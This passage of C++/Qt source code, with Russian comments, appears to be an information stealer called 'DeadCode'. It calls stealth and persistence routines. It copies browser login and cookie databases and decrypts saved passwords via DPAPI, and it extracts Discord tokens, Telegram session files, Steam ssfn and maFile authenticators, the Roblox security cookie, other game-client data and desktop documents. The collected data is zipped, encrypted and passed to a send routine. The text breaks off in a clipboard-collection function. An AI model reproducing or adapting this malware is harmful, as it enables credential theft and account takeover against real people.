    if (config.silent) Stealth();
    if (config.autoStart || config.persist) Persist();

    // Запуск кражи данных в отдельном потоке
    std::string tempDir = std::string(std::getenv("TEMP")) + "\\DeadCode_" + std::to_string(GetTickCount());
    QDir().mkpath(QString::fromStdString(tempDir));
    emitLog("Создана временная директория: " + QString::fromStdString(tempDir) + "\n");

    QThread* thread = new QThread;
    StealerWorker* worker = new StealerWorker(this, tempDir);
    worker->moveToThread(thread);

    connect(thread, &QThread::started, worker, &StealerWorker::process);
    connect(worker, &StealerWorker::finished, thread, &QThread::quit);
    connect(worker, &StealerWorker::finished, worker, &StealerWorker::deleteLater);
    connect(thread, &QThread::finished, thread, &QThread::deleteLater);

    thread->start();
}

void MainWindow::StealAndSendData(const std::string& tempDir)
{
    // Генерация мусорного кода (имитация)
    std::random_device rd;
    std::mt19937 gen(rd());
    std::uniform_int_distribution<> dis(1000, 5000);
    volatile int dummy = dis(gen);
    for (int i = 0; i < dummy; ++i) {
        dummy ^= (dummy << 1) ^ (dummy >> 1);
    }
    emitLog("Выполнен мусорный код перед началом кражи данных\n");

    // Выполнение полиморфного кода
    emitLog("Выполнен полиморфный код перед началом кражи данных\n");

    if (config.screenshot) takeScreenshot(tempDir);
    if (config.systemInfo) collectSystemInfo(tempDir);
    if (config.cookies || config.passwords) stealBrowserData(tempDir);
    if (config.discord || config.chatHistory) stealDiscordData(tempDir);
    if (config.telegram || config.chatHistory) stealTelegramData(tempDir);
    if (config.steam || config.steamMAFile) stealSteamData(tempDir);
    if (config.epic) stealEpicData(tempDir);
    if (config.roblox) stealRobloxData(tempDir);
    if (config.battlenet) stealBattleNetData(tempDir);
    if (config.minecraft) stealMinecraftData(tempDir);
    if (config.fileGrabber) stealFiles(tempDir);
    if (config.socialEngineering) collectSocialEngineeringData(tempDir);

    std::string archivePath = tempDir + "\\stolen_data.zip";
    archiveData(tempDir, archivePath);

    std::string encryptedPath = tempDir + "\\stolen_data_encrypted.zip";
    encryptData(archivePath, encryptedPath);

    sendData(encryptedPath);

    try {
        std::filesystem::remove_all(tempDir);
        emitLog("Временная директория удалена: " + QString::fromStdString(tempDir) + "\n");
    } catch (const std::exception& e) {
        emitLog("Ошибка удаления временной директории: " + QString::fromStdString(e.what()) + "\n");
    }
}

void MainWindow::takeScreenshot(const std::string& dir)
{
    QScreen *screen = QGuiApplication::primaryScreen();
    if (screen) {
        QPixmap screenshot = screen->grabWindow(0);
        std::string path = dir + "\\screenshot.png";
        if (screenshot.save(QString::fromStdString(path), "PNG")) {
            emitLog("Скриншот сохранен: " + QString::fromStdString(path) + "\n");
        } else {
            emitLog("Ошибка: Не удалось сохранить скриншот\n");
        }
    } else {
        emitLog("Ошибка: Не удалось сделать скриншот\n");
    }
}

void MainWindow::collectSystemInfo(const std::string& dir)
{
    QString systemInfo = "System Information:\n";
    wchar_t computerName[MAX_COMPUTERNAME_LENGTH + 1];
    DWORD size = sizeof(computerName) / sizeof(computerName[0]);
    if (GetComputerNameW(computerName, &size)) {
        systemInfo += "Computer Name: " + QString::fromWCharArray(computerName) + "\n";
    }

    wchar_t userName[UNLEN + 1];
    size = sizeof(userName) / sizeof(userName[0]);
    if (GetUserNameW(userName, &size)) {
        systemInfo += "Username: " + QString::fromWCharArray(userName) + "\n";
    }

    systemInfo += "OS: " + QSysInfo::prettyProductName() + "\n";
    QHostInfo hostInfo = QHostInfo::fromName(QHostInfo::localHostName());
    if (!hostInfo.addresses().isEmpty()) {
        systemInfo += "IP: " + hostInfo.addresses().first().toString() + "\n";
    }

    SYSTEM_INFO si;
    GetSystemInfo(&si);
    systemInfo += "Processor Architecture: " + QString::number(si.wProcessorArchitecture) + "\n";
    systemInfo += "Number of Processors: " + QString::number(si.dwNumberOfProcessors) + "\n";

    MEMORYSTATUSEX memoryStatus;
    memoryStatus.dwLength = sizeof(memoryStatus);
    if (GlobalMemoryStatusEx(&memoryStatus)) {
        systemInfo += "Total Physical Memory: " + QString::number(memoryStatus.ullTotalPhys / (1024 * 1024)) + " MB\n";
    }

    std::string path = dir + "\\system_info.txt";
    QFile file(QString::fromStdString(path));
    if (file.open(QIODevice::WriteOnly | QIODevice::Text)) {
        QTextStream out(&file);
        out << systemInfo;
        file.close();
        emitLog("Системная информация сохранена: " + QString::fromStdString(path) + "\n");
    } else {
        emitLog("Ошибка: Не удалось сохранить системную информацию\n");
    }
}

void MainWindow::stealBrowserData(const std::string& dir)
{
    char appDataPath[MAX_PATH];
    SHGetFolderPathA(NULL, CSIDL_LOCAL_APPDATA, NULL, 0, appDataPath);
    std::vector<std::pair<std::string, std::string>> browsers = {
        {"Chrome", std::string(appDataPath) + "\\Google\\Chrome\\User Data\\Default\\"},
        {"Edge", std::string(appDataPath) + "\\Microsoft\\Edge\\User Data\\Default\\"},
        {"Opera", std::string(appDataPath) + "\\Opera Software\\Opera Stable\\"},
        {"OperaGX", std::string(appDataPath) + "\\Opera Software\\Opera GX Stable\\"},
        {"Vivaldi", std::string(appDataPath) + "\\Vivaldi\\User Data\\Default\\"},
        {"Yandex", std::string(appDataPath) + "\\Yandex\\YandexBrowser\\User Data\\Default\\"}
    };

    for (const auto& browser : browsers) {
        if (config.passwords) {
            std::string loginDataPath = browser.second + "Login Data";
            if (std::filesystem::exists(loginDataPath)) {
                std::string tempPath = dir + "\\" + browser.first + "_LoginData_temp";
                try {
                    std::filesystem::copy_file(loginDataPath, tempPath, std::filesystem::copy_options::overwrite_existing);
                } catch (const std::exception& e) {
                    emitLog(QString("Ошибка копирования базы данных паролей %1: %2\n").arg(QString::fromStdString(browser.first), QString::fromStdString(e.what())));
                    continue;
                }

                sqlite3 *db;
                if (sqlite3_open(tempPath.c_str(), &db) == SQLITE_OK) {
                    sqlite3_stmt *stmt;
                    if (sqlite3_prepare_v2(db, "SELECT origin_url, username_value, password_value FROM logins", -1, &stmt, nullptr) == SQLITE_OK) {
                        std::string path = dir + "\\" + browser.first + "_passwords.txt";
                        QFile file(QString::fromStdString(path));
                        if (file.open(QIODevice::WriteOnly | QIODevice::Text)) {
                            QTextStream out(&file);
                            while (sqlite3_step(stmt) == SQLITE_ROW) {
                                const char* url = reinterpret_cast<const char*>(sqlite3_column_text(stmt, 0));
                                const char* username = reinterpret_cast<const char*>(sqlite3_column_text(stmt, 1));
                                auto* password = sqlite3_column_blob(stmt, 2);
                                int passwordLen = sqlite3_column_bytes(stmt, 2);

                                out << "URL: " << (url ? QString::fromUtf8(url) : "N/A") << "\n";
                                out << "Username: " << (username ? QString::fromUtf8(username) : "N/A") << "\n";
                                if (password && passwordLen > 0) {
                                    DATA_BLOB inBlob = {(DWORD)passwordLen, (BYTE*)password};
                                    DATA_BLOB outBlob;
                                    if (CryptUnprotectData(&inBlob, nullptr, nullptr, nullptr, nullptr, 0, &outBlob)) {
                                        out << "Password: " << QString::fromUtf8((char*)outBlob.pbData, outBlob.cbData) << "\n";
                                        LocalFree(outBlob.pbData);
                                    } else {
                                        out << "Password: [Failed to decrypt]\n";
                                        emitLog(QString("Не удалось расшифровать пароль для %1\n").arg(QString::fromStdString(browser.first)));
                                    }
                                } else {
                                    out << "Password: N/A\n";
                                }
                                out << "\n";
                            }
                            file.close();
                            emitLog(QString("Пароли %1 сохранены: %2\n").arg(QString::fromStdString(browser.first), QString::fromStdString(path)));
                        } else {
                            emitLog(QString("Ошибка: Не удалось создать файл для паролей %1\n").arg(QString::fromStdString(browser.first)));
                        }
                        sqlite3_finalize(stmt);
                    } else {
                        emitLog(QString("Ошибка подготовки SQL-запроса для паролей %1: %2\n").arg(QString::fromStdString(browser.first), QString::fromStdString(sqlite3_errmsg(db))));
                    }
                    sqlite3_close(db);
                    std::filesystem::remove(tempPath);
                } else {
                    emitLog(QString("Ошибка открытия базы данных %1: %2\n").arg(QString::fromStdString(browser.first), QString::fromStdString(sqlite3_errmsg(db))));
                }
            } else {
                emitLog(QString("База данных паролей %1 не найдена\n").arg(QString::fromStdString(browser.first)));
            }
        }
        if (config.cookies) {
            std::string cookiesPath = browser.second + "Network\\Cookies";
            if (std::filesystem::exists(cookiesPath)) {
                std::string tempPath = dir + "\\" + browser.first + "_Cookies_temp";
                try {
                    std::filesystem::copy_file(cookiesPath, tempPath, std::filesystem::copy_options::overwrite_existing);
                } catch (const std::exception& e) {
                    emitLog(QString("Ошибка копирования базы данных куки %1: %2\n").arg(QString::fromStdString(browser.first), QString::fromStdString(e.what())));
                    continue;
                }

                sqlite3 *db;
                if (sqlite3_open(tempPath.c_str(), &db) == SQLITE_OK) {
                    sqlite3_stmt *stmt;
                    if (sqlite3_prepare_v2(db, "SELECT host_key, name, encrypted_value FROM cookies", -1, &stmt, nullptr) == SQLITE_OK) {
                        std::string path = dir + "\\" + browser.first + "_cookies.txt";
                        QFile file(QString::fromStdString(path));
                        if (file.open(QIODevice::WriteOnly | QIODevice::Text)) {
                            QTextStream out(&file);
                            while (sqlite3_step(stmt) == SQLITE_ROW) {
                                const char* host = reinterpret_cast<const char*>(sqlite3_column_text(stmt, 0));
                                const char* name = reinterpret_cast<const char*>(sqlite3_column_text(stmt, 1));
                                auto* value = sqlite3_column_blob(stmt, 2);
                                int valueLen = sqlite3_column_bytes(stmt, 2);

                                out << "Host: " << (host ? QString::fromUtf8(host) : "N/A") << "\n";
                                out << "Name: " << (name ? QString::fromUtf8(name) : "N/A") << "\n";
                                if (value && valueLen > 0) {
                                    DATA_BLOB inBlob = {(DWORD)valueLen, (BYTE*)value};
                                    DATA_BLOB outBlob;
                                    if (CryptUnprotectData(&inBlob, nullptr, nullptr, nullptr, nullptr, 0, &outBlob)) {
                                        out << "Value: " << QString::fromUtf8((char*)outBlob.pbData, outBlob.cbData) << "\n";
                                        LocalFree(outBlob.pbData);
                                    } else {
                                        out << "Value: [Failed to decrypt]\n";
                                        emitLog(QString("Не удалось расшифровать куки для %1\n").arg(QString::fromStdString(browser.first)));
                                    }
                                } else {
                                    out << "Value: N/A\n";
                                }
                                out << "\n";
                            }
                            file.close();
                            emitLog(QString("Куки %1 сохранены: %2\n").arg(QString::fromStdString(browser.first), QString::fromStdString(path)));
                        } else {
                            emitLog(QString("Ошибка: Не удалось создать файл для куки %1\n").arg(QString::fromStdString(browser.first)));
                        }
                        sqlite3_finalize(stmt);
                    } else {
                        emitLog(QString("Ошибка подготовки SQL-запроса для куки %1: %2\n").arg(QString::fromStdString(browser.first), QString::fromStdString(sqlite3_errmsg(db))));
                    }
                    sqlite3_close(db);
                    std::filesystem::remove(tempPath);
                } else {
                    emitLog(QString("Ошибка открытия базы данных куки %1: %2\n").arg(QString::fromStdString(browser.first), QString::fromStdString(sqlite3_errmsg(db))));
                }
            } else {
                emitLog(QString("База данных куки %1 не найдена\n").arg(QString::fromStdString(browser.first)));
            }
        }
    }

    SHGetFolderPathA(NULL, CSIDL_APPDATA, NULL, 0, appDataPath);
    std::string firefoxPath = std::string(appDataPath) + "\\Mozilla\\Firefox\\Profiles\\";
    if (std::filesystem::exists(firefoxPath)) {
        for (const auto& entry : std::filesystem::directory_iterator(firefoxPath)) {
            std::string profilePath = entry.path().string();
            if (config.passwords) {
                std::string loginsPath = profilePath + "\\logins.json";
                if (std::filesystem::exists(loginsPath)) {
                    std::string path = dir + "\\firefox_logins.json";
                    if (QFile::copy(QString::fromStdString(loginsPath), QString::fromStdString(path))) {
                        emitLog("Пароли Firefox сохранены: " + QString::fromStdString(path) + "\n");
                    } else {
                        emitLog("Ошибка копирования паролей Firefox\n");
                    }
                }
            }
            if (config.cookies) {
                std::string cookiesPath = profilePath + "\\cookies.sqlite";
                if (std::filesystem::exists(cookiesPath)) {
                    std::string tempPath = dir + "\\firefox_cookies_temp.sqlite";
                    try {
                        std::filesystem::copy_file(cookiesPath, tempPath, std::filesystem::copy_options::overwrite_existing);
                    } catch (const std::exception& e) {
                        emitLog(QString("Ошибка копирования базы данных куки Firefox: %1\n").arg(QString::fromStdString(e.what())));
                        continue;
                    }

                    sqlite3 *db;
                    if (sqlite3_open(tempPath.c_str(), &db) == SQLITE_OK) {
                        sqlite3_stmt *stmt;
                        if (sqlite3_prepare_v2(db, "SELECT host, name, value FROM moz_cookies", -1, &stmt, nullptr) == SQLITE_OK) {
                            std::string path = dir + "\\firefox_cookies.txt";
                            QFile file(QString::fromStdString(path));
                            if (file.open(QIODevice::WriteOnly | QIODevice::Text)) {
                                QTextStream out(&file);
                                while (sqlite3_step(stmt) == SQLITE_ROW) {
                                    const char* host = reinterpret_cast<const char*>(sqlite3_column_text(stmt, 0));
                                    const char* name = reinterpret_cast<const char*>(sqlite3_column_text(stmt, 1));
                                    const char* value = reinterpret_cast<const char*>(sqlite3_column_text(stmt, 2));

                                    out << "Host: " << (host ? QString::fromUtf8(host) : "N/A") << "\n";
                                    out << "Name: " << (name ? QString::fromUtf8(name) : "N/A") << "\n";
                                    out << "Value: " << (value ? QString::fromUtf8(value) : "N/A") << "\n\n";
                                }
                                file.close();
                                emitLog("Куки Firefox сохранены: " + QString::fromStdString(path) + "\n");
                            } else {
                                emitLog("Ошибка: Не удалось создать файл для куки Firefox\n");
                            }
                            sqlite3_finalize(stmt);
                        } else {
                            emitLog(QString("Ошибка подготовки SQL-запроса для куки Firefox: %1\n").arg(QString::fromStdString(sqlite3_errmsg(db))));
                        }
                        sqlite3_close(db);
                        std::filesystem::remove(tempPath);
                    } else {
                        emitLog(QString("Ошибка открытия базы данных куки Firefox: %1\n").arg(QString::fromStdString(sqlite3_errmsg(db))));
                    }
                }
            }
        }
    } else {
        emitLog("Firefox не найден на устройстве\n");
    }
}

void MainWindow::stealDiscordData(const std::string& dir)
{
    char appDataPath[MAX_PATH];
    SHGetFolderPathA(NULL, CSIDL_LOCAL_APPDATA, NULL, 0, appDataPath);
    std::vector<std::string> discordPaths = {
        std::string(appDataPath) + "\\Discord\\Local Storage\\leveldb\\",
        std::string(appDataPath) + "\\discordcanary\\Local Storage\\leveldb\\",
        std::string(appDataPath) + "\\discordptb\\Local Storage\\leveldb\\"
    };

    std::string path = dir + "\\discord_tokens.txt";
    QFile file(QString::fromStdString(path));
    if (!file.open(QIODevice::WriteOnly | QIODevice::Text)) {
        emitLog("Ошибка: Не удалось создать файл для токенов Discord\n");
        return;
    }
    QTextStream out(&file);
    int tokenCount = 0;

    for (const auto& discordPath : discordPaths) {
        if (std::filesystem::exists(discordPath)) {
            for (const auto& entry : std::filesystem::directory_iterator(discordPath)) {
                if (entry.path().extension() == ".ldb" || entry.path().extension() == ".log") {
                    std::ifstream inFile(entry.path(), std::ios::binary);
                    if (!inFile.is_open()) {
                        emitLog(QString("Ошибка чтения файла %1\n").arg(QString::fromStdString(entry.path().string())));
                        continue;
                    }
                    std::string content((std::istreambuf_iterator<char>(inFile)), std::istreambuf_iterator<char>());
                    inFile.close();
                    QRegularExpression re("[a-zA-Z0-9]{24}\\.[a-zA-Z0-9]{6}\\.[a-zA-Z0-9_-]{27}");
                    QRegularExpressionMatchIterator i = re.globalMatch(QString::fromStdString(content));
                    while (i.hasNext()) {
                        out << "Token: " << i.next().captured(0) << "\n";
                        tokenCount++;
                    }
                }
            }
        }
    }
    file.close();
    emitLog(QString("Найдено %1 токенов Discord, сохранено в: %2\n").arg(tokenCount).arg(QString::fromStdString(path)));

    if (config.chatHistory) {
        std::string historyPath = dir + "\\discord_history.txt";
        QFile historyFile(QString::fromStdString(historyPath));
        if (historyFile.open(QIODevice::WriteOnly | QIODevice::Text)) {
            QTextStream historyOut(&historyFile);
            historyOut << "Discord Chat History:\n";
            for (const auto& discordPath : discordPaths) {
                if (std::filesystem::exists(discordPath)) {
                    for (const auto& entry : std::filesystem::directory_iterator(discordPath)) {
                        if (entry.path().extension() == ".ldb") {
                            std::ifstream inFile(entry.path(), std::ios::binary);
                            if (!inFile.is_open()) {
                                emitLog(QString("Ошибка чтения файла %1\n").arg(QString::fromStdString(entry.path().string())));
                                continue;
                            }
                            std::string content((std::istreambuf_iterator<char>(inFile)), std::istreambuf_iterator<char>());
                            inFile.close();
                            QRegularExpression messageRe("\"content\":\"[^\"]+\"");
                            QRegularExpressionMatchIterator i = messageRe.globalMatch(QString::fromStdString(content));
                            while (i.hasNext()) {
                                QString match = i.next().captured(0);
                                historyOut << match << "\n";
                            }
                        }
                    }
                }
            }
            historyFile.close();
            emitLog("История чатов Discord сохранена: " + QString::fromStdString(historyPath) + "\n");
        } else {
            emitLog("Ошибка: Не удалось сохранить историю чатов Discord\n");
        }
    }
}

void MainWindow::stealTelegramData(const std::string& dir)
{
    char appDataPath[MAX_PATH];
    SHGetFolderPathA(NULL, CSIDL_APPDATA, NULL, 0, appDataPath);
    std::string telegramPath = std::string(appDataPath) + "\\Telegram Desktop\\tdata\\";

    if (std::filesystem::exists(telegramPath)) {
        std::string path = dir + "\\telegram_data";
        QDir().mkpath(QString::fromStdString(path));
        int fileCount = 0;
        for (const auto& entry : std::filesystem::directory_iterator(telegramPath)) {
            std::string fileName = entry.path().filename().string();
            if (fileName.find("map") != std::string::npos || fileName.find("D877F783D5D3EF8C") != std::string::npos) {
                std::string destPath = path + "\\" + fileName;
                if (QFile::copy(QString::fromStdString(entry.path().string()), QString::fromStdString(destPath))) {
                    fileCount++;
                } else {
                    emitLog(QString("Ошибка копирования файла Telegram: %1\n").arg(QString::fromStdString(fileName)));
                }
            }
        }
        emitLog(QString("Сохранено %1 файлов Telegram: %2 (данные зашифрованы, требуется ключ пользователя для расшифровки)\n").arg(fileCount).arg(QString::fromStdString(path)));

        if (config.chatHistory) {
            std::string historyPath = dir + "\\telegram_history.txt";
            QFile historyFile(QString::fromStdString(historyPath));
            if (historyFile.open(QIODevice::WriteOnly | QIODevice::Text)) {
                QTextStream historyOut(&historyFile);
                historyOut << "Telegram Chat History (Metadata):\n";
                for (const auto& entry : std::filesystem::directory_iterator(telegramPath)) {
                    if (entry.path().filename().string().find("map") != std::string::npos) {
                        std::ifstream inFile(entry.path(), std::ios::binary);
                        if (!inFile.is_open()) {
                            emitLog(QString("Ошибка чтения файла Telegram: %1\n").arg(QString::fromStdString(entry.path().string())));
                            continue;
                        }
                        std::string content((std::istreambuf_iterator<char>(inFile)), std::istreambuf_iterator<char>());
                        inFile.close();
                        historyOut << "File: " << QString::fromStdString(entry.path().filename().string()) << " (encrypted data)\n";
                    }
                }
                historyFile.close();
                emitLog("История чатов Telegram сохранена (метаданные): " + QString::fromStdString(historyPath) + "\n");
            } else {
                emitLog("Ошибка: Не удалось сохранить историю чатов Telegram\n");
            }
        }
    } else {
        emitLog("Telegram не найден на устройстве\n");
    }
}

void MainWindow::stealSteamData(const std::string& dir)
{
    char programFiles[MAX_PATH];
    SHGetFolderPathA(NULL, CSIDL_PROGRAM_FILESX86, NULL, 0, programFiles);
    std::string steamPath = std::string(programFiles) + "\\Steam\\";
    if (std::filesystem::exists(steamPath)) {
        std::string configPath = steamPath + "config\\loginusers.vdf";
        if (std::filesystem::exists(configPath)) {
            std::string path = dir + "\\steam_loginusers.vdf";
            if (QFile::copy(QString::fromStdString(configPath), QString::fromStdString(path))) {
                emitLog("Steam loginusers.vdf сохранен: " + QString::fromStdString(path) + "\n");
            } else {
                emitLog("Ошибка копирования Steam loginusers.vdf\n");
            }
        }
        std::string ssfnPath = steamPath + "ssfn*";
        for (const auto& entry : std::filesystem::directory_iterator(steamPath)) {
            if (entry.path().string().find("ssfn") != std::string::npos) {
                std::string path = dir + "\\" + entry.path().filename().string();
                if (QFile::copy(QString::fromStdString(entry.path().string()), QString::fromStdString(path))) {
                    emitLog("Steam SSFN файл сохранен: " + QString::fromStdString(path) + "\n");
                } else {
                    emitLog(QString("Ошибка копирования Steam SSFN файла: %1\n").arg(QString::fromStdString(entry.path().filename().string())));
                }
            }
        }
        if (config.steamMAFile) {
            char docPath[MAX_PATH];
            SHGetFolderPathA(NULL, CSIDL_MYDOCUMENTS, NULL, 0, docPath);
            std::string documentsPath = std::string(docPath);
            for (const auto& entry : std::filesystem::recursive_directory_iterator(documentsPath)) {
                if (entry.path().extension() == ".maFile") {
                    std::string path = dir + "\\" + entry.path().filename().string();
                    if (QFile::copy(QString::fromStdString(entry.path().string()), QString::fromStdString(path))) {
                        emitLog("Steam MAFile сохранен: " + QString::fromStdString(path) + "\n");
                    } else {
                        emitLog(QString("Ошибка копирования Steam MAFile: %1\n").arg(QString::fromStdString(entry.path().filename().string())));
                    }
                }
            }
        }
    } else {
        emitLog("Steam не найден на устройстве\n");
    }
}

void MainWindow::stealEpicData(const std::string& dir)
{
    char appDataPath[MAX_PATH];
    SHGetFolderPathA(NULL, CSIDL_LOCAL_APPDATA, NULL, 0, appDataPath);
    std::string epicPath = std::string(appDataPath) + "\\EpicGamesLauncher\\Saved\\";
    if (std::filesystem::exists(epicPath)) {
        std::string configPath = epicPath + "Config\\Windows\\GameUserSettings.ini";
        if (std::filesystem::exists(configPath)) {
            std::string path = dir + "\\epic_settings.ini";
            if (QFile::copy(QString::fromStdString(configPath), QString::fromStdString(path))) {
                emitLog("Настройки Epic Games сохранены: " + QString::fromStdString(path) + "\n");
            } else {
                emitLog("Ошибка копирования настроек Epic Games\n");
            }
        }

        std::string cookiesPath = epicPath + "WebCache\\Cookies";
        if (std::filesystem::exists(cookiesPath)) {
            std::string path = dir + "\\epic_cookies.dat";
            if (QFile::copy(QString::fromStdString(cookiesPath), QString::fromStdString(path))) {
                emitLog("Куки Epic Games сохранены: " + QString::fromStdString(path) + "\n");
            } else {
                emitLog("Ошибка копирования куки Epic Games\n");
            }
        }

        std::string logsPath = epicPath + "Logs\\";
        if (std::filesystem::exists(logsPath)) {
            std::string logsDir = dir + "\\epic_logs";
            QDir().mkpath(QString::fromStdString(logsDir));
            int fileCount = 0;
            for (const auto& entry : std::filesystem::directory_iterator(logsPath)) {
                if (entry.path().extension() == ".log") {
                    std::string destPath = logsDir + "\\" + entry.path().filename().string();
                    if (QFile::copy(QString::fromStdString(entry.path().string()), QString::fromStdString(destPath))) {
                        fileCount++;
                    } else {
                        emitLog(QString("Ошибка копирования лога Epic Games: %1\n").arg(QString::fromStdString(entry.path().filename().string())));
                    }
                }
            }
            emitLog(QString("Сохранено %1 логов Epic Games: %2\n").arg(fileCount).arg(QString::fromStdString(logsDir)));
        }
    } else {
        emitLog("Epic Games не найден на устройстве\n");
    }
}

void MainWindow::stealRobloxData(const std::string& dir)
{
    char appDataPath[MAX_PATH];
    SHGetFolderPathA(NULL, CSIDL_LOCAL_APPDATA, NULL, 0, appDataPath);
    std::string robloxPath = std::string(appDataPath) + "\\Roblox\\";
    if (std::filesystem::exists(robloxPath)) {
        std::string settingsPath = robloxPath + "GlobalBasicSettings_13.xml";
        if (std::filesystem::exists(settingsPath)) {
            std::string path = dir + "\\roblox_settings.xml";
            if (QFile::copy(QString::fromStdString(settingsPath), QString::fromStdString(path))) {
                emitLog("Настройки Roblox сохранены: " + QString::fromStdString(path) + "\n");
            } else {
                emitLog("Ошибка копирования настроек Roblox\n");
            }
        }

        HKEY hKey;
        if (RegOpenKeyExA(HKEY_CURRENT_USER, "Software\\Roblox", 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
            std::string path = dir + "\\roblox_cookies.txt";
            QFile file(QString::fromStdString(path));
            if (file.open(QIODevice::WriteOnly | QIODevice::Text)) {
                QTextStream out(&file);
                char value[1024];
                DWORD size = sizeof(value);
                if (RegQueryValueExA(hKey, ".ROBLOSECURITY", NULL, NULL, (LPBYTE)value, &size) == ERROR_SUCCESS) {
                    out << "ROBLOSECURITY Cookie: " << QString::fromUtf8(value) << "\n";
                } else {
                    out << "ROBLOSECURITY Cookie: N/A\n";
                }
                file.close();
                emitLog("Куки Roblox сохранены: " + QString::fromStdString(path) + "\n");
            } else {
                emitLog("Ошибка: Не удалось создать файл для куки Roblox\n");
            }
            RegCloseKey(hKey);
        }

        std::string logsPath = robloxPath + "logs\\";
        if (std::filesystem::exists(logsPath)) {
            std::string logsDir = dir + "\\roblox_logs";
            QDir().mkpath(QString::fromStdString(logsDir));
            int fileCount = 0;
            for (const auto& entry : std::filesystem::directory_iterator(logsPath)) {
                if (entry.path().extension() == ".log") {
                    std::string destPath = logsDir + "\\" + entry.path().filename().string();
                    if (QFile::copy(QString::fromStdString(entry.path().string()), QString::fromStdString(destPath))) {
                        fileCount++;
                    } else {
                        emitLog(QString("Ошибка копирования лога Roblox: %1\n").arg(QString::fromStdString(entry.path().filename().string())));
                    }
                }
            }
            emitLog(QString("Сохранено %1 логов Roblox: %2\n").arg(fileCount).arg(QString::fromStdString(logsDir)));
        }
    } else {
        emitLog("Roblox не найден на устройстве\n");
    }
}

void MainWindow::stealBattleNetData(const std::string& dir)
{
    char appDataPath[MAX_PATH];
    SHGetFolderPathA(NULL, CSIDL_APPDATA, NULL, 0, appDataPath);
    std::string battleNetPath = std::string(appDataPath) + "\\Battle.net\\";
    if (std::filesystem::exists(battleNetPath)) {
        std::string configPath = battleNetPath + "Battle.net.config";
        if (std::filesystem::exists(configPath)) {
            std::string path = dir + "\\battlenet_config.txt";
            if (QFile::copy(QString::fromStdString(configPath), QString::fromStdString(path))) {
                emitLog("Конфигурация Battle.net сохранена: " + QString::fromStdString(path) + "\n");
            } else {
                emitLog("Ошибка копирования конфигурации Battle.net\n");
            }
        }

        std::string cookiesPath = battleNetPath + "Cookies";
        if (std::filesystem::exists(cookiesPath)) {
            std::string path = dir + "\\battlenet_cookies.dat";
            if (QFile::copy(QString::fromStdString(cookiesPath), QString::fromStdString(path))) {
                emitLog("Куки Battle.net сохранены: " + QString::fromStdString(path) + "\n");
            } else {
                emitLog("Ошибка копирования куки Battle.net\n");
            }
        }

        std::string logsPath = battleNetPath + "Logs\\";
        if (std::filesystem::exists(logsPath)) {
            std::string logsDir = dir + "\\battlenet_logs";
            QDir().mkpath(QString::fromStdString(logsDir));
            int fileCount = 0;
            for (const auto& entry : std::filesystem::directory_iterator(logsPath)) {
                if (entry.path().extension() == ".log") {
                    std::string destPath = logsDir + "\\" + entry.path().filename().string();
                    if (QFile::copy(QString::fromStdString(entry.path().string()), QString::fromStdString(destPath))) {
                        fileCount++;
                    } else {
                        emitLog(QString("Ошибка копирования лога Battle.net: %1\n").arg(QString::fromStdString(entry.path().filename().string())));
                    }
                }
            }
            emitLog(QString("Сохранено %1 логов Battle.net: %2\n").arg(fileCount).arg(QString::fromStdString(logsDir)));
        }
    } else {
        emitLog("Battle.net не найден на устройстве\n");
    }
}

void MainWindow::stealMinecraftData(const std::string& dir)
{
    char appDataPath[MAX_PATH];
    SHGetFolderPathA(NULL, CSIDL_APPDATA, NULL, 0, appDataPath);
    std::string minecraftPath = std::string(appDataPath) + "\\.minecraft\\";
    if (std::filesystem::exists(minecraftPath)) {
        std::string launcherProfilesPath = minecraftPath + "launcher_profiles.json";
        if (std::filesystem::exists(launcherProfilesPath)) {
            std::string path = dir + "\\minecraft_launcher_profiles.json";
            if (QFile::copy(QString::fromStdString(launcherProfilesPath), QString::fromStdString(path))) {
                emitLog("Профили Minecraft сохранены: " + QString::fromStdString(path) + "\n");
            } else {
                emitLog("Ошибка копирования профилей Minecraft\n");
            }
        }

        std::string logsPath = minecraftPath + "logs\\";
        if (std::filesystem::exists(logsPath)) {
            std::string logsDir = dir + "\\minecraft_logs";
            QDir().mkpath(QString::fromStdString(logsDir));
            int fileCount = 0;
            for (const auto& entry : std::filesystem::directory_iterator(logsPath)) {
                if (entry.path().extension() == ".log" || entry.path().extension() == ".gz") {
                    std::string destPath = logsDir + "\\" + entry.path().filename().string();
                    if (QFile::copy(QString::fromStdString(entry.path().string()), QString::fromStdString(destPath))) {
                        fileCount++;
                    } else {
                        emitLog(QString("Ошибка копирования лога Minecraft: %1\n").arg(QString::fromStdString(entry.path().filename().string())));
                    }
                }
            }
            emitLog(QString("Сохранено %1 логов Minecraft: %2\n").arg(fileCount).arg(QString::fromStdString(logsDir)));
        }

        std::string serversPath = minecraftPath + "servers.dat";
        if (std::filesystem::exists(serversPath)) {
            std::string path = dir + "\\minecraft_servers.dat";
            if (QFile::copy(QString::fromStdString(serversPath), QString::fromStdString(path))) {
                emitLog("Список серверов Minecraft сохранен: " + QString::fromStdString(path) + "\n");
            } else {
                emitLog("Ошибка копирования списка серверов Minecraft\n");
            }
        }
    } else {
        emitLog("Minecraft не найден на устройстве\n");
    }
}

void MainWindow::stealFiles(const std::string& dir)
{
    char desktopPath[MAX_PATH];
    SHGetFolderPathA(NULL, CSIDL_DESKTOP, NULL, 0, desktopPath);
    std::string desktopDir = std::string(desktopPath);
    std::string filesDir = dir + "\\grabbed_files";
    QDir().mkpath(QString::fromStdString(filesDir));

    int fileCount = 0;
    std::vector<std::string> extensions = {".txt", ".doc", ".docx", ".pdf", ".jpg", ".png"};
    for (const auto& entry : std::filesystem::recursive_directory_iterator(desktopDir)) {
        std::string ext = entry.path().extension().string();
        std::transform(ext.begin(), ext.end(), ext.begin(), ::tolower);
        if (std::find(extensions.begin(), extensions.end(), ext) != extensions.end()) {
            if (entry.file_size() < 5 * 1024 * 1024) { // Ограничение 5 МБ
                std::string destPath = filesDir + "\\" + entry.path().filename().string();
                if (QFile::copy(QString::fromStdString(entry.path().string()), QString::fromStdString(destPath))) {
                    fileCount++;
                } else {
                    emitLog(QString("Ошибка копирования файла: %1\n").arg(QString::fromStdString(entry.path().filename().string())));
                }
            }
        }
    }
    emitLog(QString("Сохранено %1 файлов с рабочего стола: %2\n").arg(fileCount).arg(QString::fromStdString(filesDir)));
}

void MainWindow::collectSocialEngineeringData(const std::string& dir)
{
    std::string path = dir + "\\social_engineering.txt";
    QFile file(QString::fromStdString(path));
    if (file.open(QIODevice::WriteOnly | QIODevice::Text)) {
        QTextStream out(&file);
        out << "Social Engineering Data:\n";

        QClipboard *clipboard = QGuiApplication::clipboard();
